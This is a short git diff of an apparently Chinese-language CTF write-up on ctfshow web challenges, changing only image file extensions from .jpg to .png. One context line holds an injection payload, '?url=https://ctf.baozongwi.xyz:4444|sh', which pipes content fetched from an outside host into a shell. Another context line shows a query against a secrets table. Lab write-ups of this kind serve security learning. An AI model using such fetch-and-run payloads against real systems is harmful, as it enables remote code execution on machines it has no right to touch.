@@ -271,7 +271,7 @@ if($schema==="https://"){
 ?url=https://ctf.baozongwi.xyz:4444|sh
 ```
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
 不过他是直接放命令进去的，可以直接截断
 
@@ -1297,7 +1297,7 @@ if __name__ == "__main__":
 
 ```
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 ## web822
 
@@ -1345,7 +1345,7 @@ select * from ctfshow_secret;
 
 延迟特别高
 
-![image](./assets/005.jpg)
+![image](./assets/005.png)
 
 ## web823
 
